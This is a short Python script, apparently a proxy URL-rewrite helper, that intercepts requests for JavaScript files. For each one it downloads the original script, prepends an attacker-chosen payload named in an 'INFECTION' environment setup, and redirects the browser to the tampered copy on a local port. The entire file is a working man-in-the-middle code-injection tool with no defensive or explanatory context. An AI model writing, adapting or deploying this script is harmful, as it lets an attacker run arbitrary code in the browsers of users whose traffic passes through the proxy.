import os
import os.path
import sys
import shutil
from urllib.request import urlopen

payload = os.environ['PAYLOAD']
infection_dir = os.environ['INFECTION_DIR']
infection_port = os.environ['INFECTION_PORT']

pid = os.getpid()
count = 0

for line in sys.stdin:

    url_in = line.split(' ')[0]

    if url_in.endswith('.js'):
        path = '{}-{}.js'.format(pid, count)
        with open(os.path.join(infection_dir, path), 'wb') as f:
            with open(payload, 'rb') as pl:
                shutil.copyfileobj(pl, f)
            with urlopen(url_in) as resp:
                shutil.copyfileobj(resp, f)
        url_out = 'http://127.0.0.1:{}/{}'.format(infection_port, path)
        print('OK rewrite-url={}'.format(url_out))
    else:
        print('ERR')

    sys.stdout.flush()
    count += 1
